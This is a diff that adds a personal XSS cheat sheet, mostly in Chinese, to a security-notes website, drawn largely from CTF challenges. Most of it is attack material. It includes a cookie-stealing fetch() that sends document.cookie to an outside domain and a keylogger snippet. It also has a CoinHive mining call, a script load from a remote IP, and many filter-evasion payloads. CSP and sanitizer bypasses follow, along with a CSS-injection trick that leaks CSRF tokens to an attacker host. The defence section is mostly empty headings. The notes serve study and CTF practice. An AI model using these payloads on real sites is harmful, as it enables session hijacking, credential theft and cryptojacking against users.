@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Web_Application_Attack/Misc.html">Web Application Attack</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Web_Application_Attack/XSS_(Cross_site_Scripting).html">XSS (Cross-site Scripting)</a></h1>
                 <span class="ModifiedDate">
-            February 16, 2021 at 1:04 AM        </span>
+            February 16, 2021 at 1:05 AM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/120_Web_Application_Attack/080_XSS_(Cross-site_Scripting).md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,701 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_XSS(Crossing_Site_Scripting)">XSS(Crossing Site Scripting)</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_XSS(Crossing_Site_Scripting)">XSS(Crossing Site Scripting)</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>Web</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Online_Resources">Online Resources</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Tools">Tools</a></p>
+</li>
+<li>
+<p><a href="#page_Challenges">Challenges</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Types">Types</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Reflected_XSS">Reflected XSS</a></p>
+</li>
+<li>
+<p><a href="#page_Stored_XSS">Stored XSS</a></p>
+</li>
+<li>
+<p><a href="#page_DOM_XSS">DOM XSS</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Popular_Sources">Popular Sources</a></p>
+</li>
+<li>
+<p><a href="#page_Popular_Sinks">Popular Sinks</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_mXSS,_UXSS,_XSSI,_Electron_XSS_to_RCE">mXSS, UXSS, XSSI, Electron XSS to RCE</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Exploit_Advantage">Exploit Advantage</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Steal_cookie">Steal cookie</a></p>
+</li>
+<li>
+<p><a href="#page_Key_logger">Key logger</a></p>
+</li>
+<li>
+<p><a href="#page_Mining">Mining</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Payloads">Payloads</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Basic_Payload">Basic Payload</a></p>
+</li>
+<li>
+<p><a href="#page_Testing">Testing</a></p>
+</li>
+<li>
+<p><a href="#page_yi_xiealert(document.domain)_de_fang_fa">一些alert(document.domain)的方法</a></p>
+</li>
+<li>
+<p><a href="#page_Some_Payload">Some Payload</a></p>
+</li>
+<li>
+<p><a href="#page_Remote_Script">Remote Script</a></p>
+</li>
+<li>
+<p><a href="#page_Polyglot_XSS">Polyglot XSS</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Bypass">Bypass</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_JavaScript_ES6_features">JavaScript ES6 features</a></p>
+</li>
+<li>
+<p><a href="#page_suan_shu_yun_suan_fu">算術運算符</a></p>
+</li>
+<li>
+<p><a href="#page_HTML_features">HTML features</a></p>
+</li>
+<li>
+<p><a href="#page_Encoding">Encoding</a></p>
+</li>
+<li>
+<p><a href="#page_Bypass_Whitespace">Bypass Whitespace</a></p>
+</li>
+<li>
+<p><a href="#page_Double_Encoding">Double Encoding</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Knowledges">Knowledges</a></p>
+</li>
+<li>
+<p><a href="#page_Preventive_measures">Preventive measures</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Escaping_Output">Escaping Output</a></p>
+</li>
+<li>
+<p><a href="#page_Validating_Input">Validating Input</a></p>
+</li>
+<li>
+<p><a href="#page_XSS_Auditor_Filter_(Browser)">XSS Auditor / Filter (Browser)</a></p>
+</li>
+<li>
+<p><a href="#page_CSP_(Content_Security_Policy)_(Browser)">CSP (Content Security Policy) (Browser)</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_CSP_evaluator">CSP evaluator</a></p>
+</li>
+<li>
+<p><a href="#page_Bypass_CSP">Bypass CSP</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Other">Other</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_aaencode_aadecode">aaencode / aadecode</a></p>
+</li>
+<li>
+<p><a href="#page_RPO">RPO</a></p>
+</li>
+<li>
+<p><a href="#page_Markdown_XSS">Markdown XSS</a></p>
+</li>
+<li>
+<p><a href="#page_wen_jianXSS">文件XSS</a></p>
+</li>
+<li>
+<p><a href="#page_CSS_Injection">CSS Injection</a></p>
+</li>
+</ul>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>Web</code></h6>
+<h1 id="page_Online_Resources">Online Resources</h1>
+<p><a href="https://github.com/s0md3v/AwesomeXSS" class="Link--external" rel="noopener noreferrer">GitHub AwesomeXSS</a>
+<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" class="Link--external" rel="noopener noreferrer">OWASP XSS Filter Evasion Cheat Sheet</a></p>
+<h2 id="page_Tools">Tools</h2>
+<ul>
+<li>
+<a href="http://monyer.com/demo/monyerjs/" class="Link--external" rel="noopener noreferrer">monyer Encoding / Decoding</a>
+</li>
+<li>
+<a href="http://www.jsfuck.com/" class="Link--external" rel="noopener noreferrer">JSFuck</a>
+</li>
+</ul>
+<h2 id="page_Challenges">Challenges</h2>
+<ul>
+<li>
+<a href="https://github.com/cure53/XSSChallengeWiki/wiki" class="Link--external" rel="noopener noreferrer">Cure53 XSS</a>
+</li>
+<li>
+<a href="http://xss.shift-js.info/" class="Link--external" rel="noopener noreferrer">xss.shift-js.info</a>
+</li>
+<li>
+<a href="http://prompt.ml/0" class="Link--external" rel="noopener noreferrer">prompt.ml/0</a>
+</li>
+</ul>
+<h1 id="page_Types">Types</h1>
+<h2 id="page_Reflected_XSS">Reflected XSS</h2>
+<p>直接輸出使用者的輸入內容</p>
+<pre><code>echo &quot;Your input:&quot; . $_GET[&quot;q&quot;];
+/?q=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<h2 id="page_Stored_XSS">Stored XSS</h2>
+<p>保存在資料庫中，常見於留言板等等</p>
+<h2 id="page_DOM_XSS">DOM XSS</h2>
+<p>最大的差別是 DOM XSS 的內容不會傳到 Server 端
+JavaScript 在處理 DOM Tree 時，導致的 XSS
+例如 fragment (在<code>#</code>後面) 不會傳到 Server</p>
+<pre><code>eval(location.hash.substr(1));
+index.html#alert(1)
+</code></pre>
+<p><a href="https://stackoverflow.com/questions/26088849/url-fragment-allowed-characters" class="Link--external" rel="noopener noreferrer">URL fragment allowed characters</a></p>
+<ul>
+<li>
+<h4 id="page_Popular_Sources">Popular Sources</h4>
+<ul>
+<li>document.URL</li>
+<li>document.documentURI</li>
+<li>location.hash.substr(1)</li>
+<li>location.href</li>
+<li>location.search</li>
+<li>location.*</li>
+<li>window.name</li>
+<li>document.referrer</li>
+</ul>
+</li>
+<li>
+<h4 id="page_Popular_Sinks">Popular Sinks</h4>
+<ul>
+<li>HTML Modification sinks
+<ul>
+<li>document.write</li>
+<li>(element).innerHTML</li>
+</ul>
+</li>
+<li>HTML modification to behaviour change
+<ul>
+<li>(element).src (in certain elements)</li>
+</ul>
+</li>
+<li>Execution Related sinks
+<ul>
+<li>eval</li>
+<li>setTimout / setInterval</li>
+<li>execScript</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_mXSS,_UXSS,_XSSI,_Electron_XSS_to_RCE">mXSS, UXSS, XSSI, Electron XSS to RCE</h2>
+<h1 id="page_Exploit_Advantage">Exploit Advantage</h1>
+<h2 id="page_Steal_cookie">Steal cookie</h2>
+<pre><code class="hljs javascript">fetch(<span class="hljs-string">"http://wildfoo.tw/?x="</span>+btoa(<span class="hljs-built_in">document</span>.cookie));
+</code></pre>
+<h2 id="page_Key_logger">Key logger</h2>
+<pre><code class="hljs javascript"><span class="hljs-built_in">document</span>.onkeypress = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>{
+    <span class="hljs-built_in">console</span>.log(e.key);
+}
+</code></pre>
+<h2 id="page_Mining">Mining</h2>
+<pre><code class="hljs javascript"><span class="hljs-keyword">var</span> miner = <span class="hljs-keyword">new</span> CoinHive.User(<span class="hljs-string">'SITE_KEY'</span>, <span class="hljs-string">'WildfootW'</span>);
+miner.start();
+</code></pre>
+<ul>
+<li>截圖</li>
+<li>動態生成釣魚頁面</li>
+<li>持久化 XSS - 安裝 Service Worker</li>
+</ul>
+<h1 id="page_Payloads">Payloads</h1>
+<p><a href="https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309" class="Link--external" rel="noopener noreferrer">tomnomnom - alert.js</a></p>
+<h2 id="page_Basic_Payload">Basic Payload</h2>
+<ul>
+<li>
+<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
+</li>
+<li>
+<code>&lt;svg/onload=alert(1)&gt;</code>
+</li>
+<li>
+<code>&lt;img src=# onerror=alert(1)&gt;</code>
+</li>
+<li>
+<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;g&lt;/a&gt;</code>
+</li>
+<li>
+<code>&lt;input type=&quot;text&quot; value=&quot;g&quot; onmouseover=&quot;alert(1)&quot; /&gt;</code>
+</li>
+<li>
+<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code>
+</li>
+<li>
+<code>&lt;iframe sRc=\/wIldFoO.tW&gt;</code>
+</li>
+</ul>
+<h2 id="page_Testing">Testing</h2>
+<ul>
+<li>
+<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
+</li>
+<li>
+<code>'&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>
+</li>
+<li>
+<code>&lt;img/src=@ onerror=alert(1)/&gt;</code>
+</li>
+<li>
+<code>'&quot;&gt;&lt;img/src=@ onerror=alert(1)/&gt;</code>
+</li>
+<li>
+<code>' onmouseover=alert(1) x='</code>
+</li>
+<li>
+<code>&quot; onmouseover=alert(1) x=&quot;</code>
+</li>
+<li>
+<code>`onmouseover=alert(1) x=`</code>
+</li>
+<li>
+<code>javascript:alert(1)//</code>
+</li>
+</ul>
+<h2 id="page_yi_xiealert(document.domain)_de_fang_fa">一些alert(document.domain)的方法</h2>
+<ul>
+<li>
+<code>(alert)(document.domain);</code>
+</li>
+<li>
+<code>al\u0065rt(document.domain);</code>
+</li>
+<li>
+<code>al\u{65}rt(document.domain);</code>
+</li>
+<li>
+<code>window['alert'](document.domain);</code>
+</li>
+<li>
+<code>alert.call(null,document.domain);</code>
+</li>
+<li>
+<code>alert.bind()(document.domain);</code>
+</li>
+</ul>
+<h2 id="page_Some_Payload">Some Payload</h2>
+<ul>
+<li>
+<code>&lt;svg/onload=alert(1);alert(2)&gt;</code>
+</li>
+<li>
+<code>&lt;svg/onload=&quot;alert(1);alert(2)&quot;&gt;</code>
+</li>
+<li>
+<code>&lt;svg/onload=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;;alert(2)&quot;&gt;</code>
+<ul>
+<li>
+<code>;;</code>改成<code>;</code>會失敗</li>
+<li>雙引號可去掉</li>
+<li>可10進位, 16進位混合</li>
+</ul>
+</li>
+<li>
+<code>&lt;svg/onload=\u0061\u006c\u0065\u0072\u0074(1)&gt;</code>
+<ul>
+<li>\u形式只能用在javascript，例如onload的a改成\u0061會失敗</li>
+</ul>
+</li>
+<li>
+<code>&lt;title&gt;&lt;a href=&quot;&lt;/title&gt;&lt;svg/onload=alert(1)&gt;</code>
+<ul>
+<li>title優先權較大，直接中斷其他標籤</li>
+</ul>
+</li>
+<li>
+<code>&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt;</code>
+<ul>
+<li>因為<code>&lt;svg&gt;</code>，HTML Entities會被解析</li>
+<li>去掉<code>&lt;svg&gt;</code>會失敗，<code>&lt;script&gt;</code>不會解析Entities</li>
+</ul>
+</li>
+<li>
+<code>&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</code>
+</li>
+<li>
+<code>&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</code>
+</li>
+<li>
+<code>&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</code>
+</li>
+<li>
+<code>&lt;% foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</code>
+</li>
+<li>
+<code>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ア+=ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ア](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</code> <a href="https://github.com/aemkei/katakana.js" class="Link--external" rel="noopener noreferrer">katakana.js</a>
+</li>
+</ul>
+<h2 id="page_Remote_Script">Remote Script</h2>
+<ul>
+<li>
+<code>&lt;script src=&quot;https://184.75.249.44/import.js&quot;&gt;&lt;/script&gt;</code>
+</li>
+<li>
+<code>&lt;svg onload=PAYLOAD&gt;</code> <a href="https://brutelogic.com.br/blog/calling-remote-script-with-event-handlers/" class="Link--external" rel="noopener noreferrer">BRUTE XSS</a>
+<ul>
+<li>
+<code>&quot;var x=new XMLHttpRequest();x.open('GET','//0');x.send(); x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}&quot;</code>
+</li>
+<li>
+<code>fetch('//0').then(r=&gt;{r.text().then(w=&gt;{write(w)})})</code>
+</li>
+<li>
+<code>with(top)body.appendChild (createElement('script')).src='//0'</code>
+</li>
+<li>
+<code>$.get('//0',r=&gt;{write(r)})</code>
+</li>
+<li>
+<code>$.getScript('//0')</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_Polyglot_XSS">Polyglot XSS</h2>
+<p>在各種地方都可以運作的 payload
+<a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot" class="Link--external" rel="noopener noreferrer">GitHub Wiki</a></p>
+<h1 id="page_Bypass">Bypass</h1>
+<p><a href="https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-10" class="Link--external" rel="noopener noreferrer">只用五種字元的 JavaScript</a></p>
+<h2 id="page_JavaScript_ES6_features">JavaScript ES6 features</h2>
+<pre><code class="hljs javascript">alert<span class="hljs-string">`1`</span>
+<span class="hljs-built_in">eval</span>.call<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-string">'alert\x281)'</span>}</span>
+</span></code></pre>
+<h2 id="page_suan_shu_yun_suan_fu">算術運算符</h2>
+<p><code>//</code> (註解) 被過濾時，可以利用算數運算符代替</p>
+<pre><code class="language-htmlmixed">&lt;a href=&quot;javascript:alert(1)-abcde&quot;&gt;xss&lt;/a&gt;
+</code></pre>
+<h2 id="page_HTML_features">HTML features</h2>
+<ul>
+<li>不分大小寫
+<ul>
+<li>
+<code>&lt;ScRipT&gt;</code>
+</li>
+<li>
+<code>&lt;img SrC=#&gt;</code>
+</li>
+</ul>
+</li>
+<li>屬性值
+<ul>
+<li>
+<code>src=&quot;#&quot;</code>
+</li>
+<li>
+<code>src='#'</code>
+</li>
+<li>
+<code>src=#</code>
+</li>
+<li>
+<code>src=`#` </code> (IE)</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_Encoding">Encoding</h2>
+<p>Javascript自解碼機制
+<code>&lt;input type=&quot;button&quot; onclick=&quot;document.write('&amp;lt;img src=@ onerror=alert(1) /&amp;gt;')&quot; /&gt;</code>會成功<code>alert(1)</code>，因為javascript位於HTML中，在執行javascript前會先解碼HTML編碼，但若是包在<code>&lt;script&gt;</code>中的javascript，不會解碼HTML編碼</p>
+<ul>
+<li>HTML Entity <code>&amp;entity_name;</code> z.B. <code>&amp;lt;</code>
+</li>
+<li>Hex Code (分號可去掉)</li>
+</ul>
+<pre><code>&lt;svg/onload=alert(1)&gt;
+&lt;svg/onload=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;
+</code></pre>
+<ul>
+<li>Decimal Code</li>
+</ul>
+<pre><code>&amp;#;
+</code></pre>
+<h2 id="page_Bypass_Whitespace">Bypass Whitespace</h2>
+<ul>
+<li>
+<code>&lt;img/src='1'/onerror=alert(0)&gt;</code>
+</li>
+</ul>
+<h2 id="page_Double_Encoding">Double Encoding</h2>
+<p><a href="https://www.owasp.org/index.php/Double_Encoding" class="Link--external" rel="noopener noreferrer">OWASP page</a>
+<code>? -&gt; %3f -&gt; %253f</code></p>
+<h1 id="page_Knowledges">Knowledges</h1>
+<ul>
+<li>
+<p>特殊標籤</p>
+<ul>
+<li>以下標籤中的腳本無法執行</li>
+<li>
+<code>&lt;title&gt;</code>, <code>&lt;textarea&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;plaintext&gt;</code>, <code>&lt;noscript&gt;</code>…</li>
+</ul>
+</li>
+<li>
+<p>偽協議</p>
+<ul>
+<li>javascript:
+<ul>
+<li>
+<code>&lt;a href=javascript:alert(1) &gt;xss&lt;/a&gt;</code>
+</li>
+</ul>
+</li>
+<li>data:
+<ul>
+<li>
+<code>&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;xss&lt;/a&gt;</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Javascript中有三套編碼/解碼函數</p>
+<ul>
+<li>escape/unescape</li>
+<li>encodeURI/decodeURI</li>
+<li>encodeURIComponent/decodeURICompinent</li>
+</ul>
+</li>
+<li>
+<p>fetch
+即使 <code>fetch</code> 會遇到 SOP 問題，但還是會送出 request
+<img src="https://i.imgur.com/rqWZqrN.png" alt="" />
+<img src="https://i.imgur.com/JH9vOzR.png" alt="" /></p>
+</li>
+</ul>
+<h1 id="page_Preventive_measures">Preventive measures</h1>
+<h2 id="page_Escaping_Output">Escaping Output</h2>
+<h2 id="page_Validating_Input">Validating Input</h2>
+<h2 id="page_XSS_Auditor_Filter_(Browser)">XSS Auditor / Filter (Browser)</h2>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection" class="Link--external" rel="noopener noreferrer">MDN docs</a>
+Header: <code>X-XSS-Protection</code></p>
+<h2 id="page_CSP_(Content_Security_Policy)_(Browser)">CSP (Content Security Policy) (Browser)</h2>
+<h3 id="page_CSP_evaluator">CSP evaluator</h3>
+<p>https://csp-evaluator.withgoogle.com/</p>
+<h3 id="page_Bypass_CSP">Bypass CSP</h3>
+<ul>
+<li>
+<p>base</p>
+<ul>
+<li>改變資源載入的域，引入惡意的js</li>
+<li>
+<code>&lt;base href =&quot;http://kaibro.tw/&quot;&gt;</code>
+</li>
+<li>RCTF 2018 - rBlog</li>
+</ul>
+</li>
+<li>
+<p>script nonce</p>
+<pre><code> &lt;p&gt;可控內容&lt;p&gt;
+ &lt;script src=&quot;xxx&quot; nonce=&quot;AAAAAAAAAAA&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>插入<code>&lt;script src=&quot;http//kaibro.tw/uccu.js&quot; a=&quot;</code></p>
+<pre><code> &lt;p&gt;&lt;script src=&quot;http//kaibro.tw/uccu.js&quot; a=&quot;&lt;p&gt;
+ &lt;script src=&quot;xxx&quot; nonce=&quot;AAAAAAAAAAA&quot;&gt;&lt;/script&gt;
+</code></pre>
+</li>
+<li>
+<p>Script Gadget</p>
+<ul>
+<li>https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</li>
+<li>is an <strong>existing</strong> JS code on the page that may be used to bypass mitigations</li>
+<li>Bypassing CSP strict-dynamic via Bootstrap
+<ul>
+<li>
+<code>&lt;div data-toggle=tooltip data-html=true title='&lt;script&gt;alert(1)&lt;/script&gt;'&gt;&lt;/div&gt;</code>
+</li>
+</ul>
+</li>
+<li>Bypassing sanitizers via jQuery Mobile
+<ul>
+<li>
+<code>&lt;div data-role=popup id='--&gt;&lt;script&gt;alert(1)&lt;/script&gt;'&gt;&lt;/div&gt;</code>
+</li>
+</ul>
+</li>
+<li>Bypassing NoScript via Closure (DOM clobbering)
+<ul>
+<li>
+<code>&lt;a id=CLOSURE_BASE_PATH href=http://attacker/xss&gt;&lt;/a&gt;</code>
+</li>
+</ul>
+</li>
+<li>Bypassing ModSecurity CRS via Dojo Toolkit
+<ul>
+<li>
+<code>&lt;div data-dojo-type=&quot;dijit/Declaration&quot; data-dojo-props=&quot;}-alert(1)-{&quot;&gt;</code>
+</li>
+</ul>
+</li>
+<li>Bypassing CSP unsafe-eval via underscore templates
+<ul>
+<li>
+<code>&lt;div type=underscore/template&gt; &lt;% alert(1) %&gt; &lt;/div&gt;</code>
+</li>
+</ul>
+</li>
+<li>0CTF 2018 - h4xors.club2</li>
+</ul>
+</li>
+<li>
+<p>google analytics ea</p>
+<ul>
+<li>ea is used to log actions and can contain arbitrary string</li>
+<li>Google CTF 2018 - gcalc2</li>
+</ul>
+</li>
+</ul>
+<h1 id="page_Other">Other</h1>
+<h2 id="page_aaencode_aadecode">aaencode / aadecode</h2>
+<ul>
+<li>http://utf-8.jp/public/aaencode.html</li>
+<li>https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html</li>
+</ul>
+<h2 id="page_RPO">RPO</h2>
+<ul>
+<li>http://example.com/a%2findex.php
+<ul>
+<li>瀏覽器會把<code>a%2findex.php</code>當成一個檔案</li>
+<li>Web Server則會正常解析成<code>a/index.php</code>
+</li>
+<li>所以當使用<strong>相對路徑</strong>載入css時，就可以透過這種方式讓瀏覽器解析到其他層目錄下的檔案
+<ul>
+<li>如果該檔案內容可控，則有機會XSS</li>
+</ul>
+</li>
+<li>舉例：
+<ul>
+<li>
+<code>/test.php</code>中有<code>&lt;link href=&quot;1/&quot; ...&gt;</code>
+</li>
+<li>另有<code>/1/index.php</code>給<code>?query=</code>參數，會直接輸出該參數內容</li>
+<li>訪問<code>/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php</code>就會讓背景變紅色
+<ul>
+<li>Server: <code>/test.php</code>
+</li>
+<li>Browser: <code>/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php</code>
+<ul>
+<li>CSS會載入<code>/1/?query={}*{background-color:red}/../../1/</code>
+</li>
+</ul>
+</li>
+<li>CSS語法容錯率很高</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_Markdown_XSS">Markdown XSS</h2>
+<ul>
+<li>
+<code>[a](javascript:prompt(document.cookie))</code>
+</li>
+<li>
+<code>[a](j a v a s c r i p t:prompt(document.cookie))</code>
+</li>
+<li>
+<code>[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</code>
+</li>
+<li>
+<code>[a](javascript:window.onerror=alert;throw%201)</code>
+</li>
+</ul>
+<h2 id="page_wen_jianXSS">文件XSS</h2>
+<ul>
+<li>Example: PlaidCTF 2018 wave XSS</li>
+<li>上傳.wave檔 (會檢查signatures)
+<pre><code>  RIFF`....WAVE...` 
+  alert(1); 
+  function RIFF(){}
+</code></pre>
+<ul>
+<li>變成合法的js語法</li>
+<li>wave在apache mime type中沒有被定義</li>
+<li>
+<code>&lt;script src=&quot;uploads/this_file.wave&quot;&gt;</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_CSS_Injection">CSS Injection</h2>
+<ul>
+<li>CSS可控時，可以Leak Information</li>
+<li>Example:
+<ul>
+<li>leak <code>&lt;input type='hidden' name='csrf' value='2e3d04bf...'&gt;</code>
+</li>
+<li>
+<code>input[name=csrf][value^=&quot;2&quot;]{background: url(http://kaibro.tw/2)}</code>
+</li>
+<li>
+<code>input[name=csrf][value^=&quot;2e&quot;]{background: url(http://kaibro.tw/2e)}</code>
+</li>
+<li>…</li>
+<li>SECCON CTF 2018 - GhostKingdom</li>
+</ul>
+</li>
+</ul>
+<p>https://github.com/s0md3v/AwesomeXSS</p>
+    </div>
 
         <nav>
         <ul class="Pager">
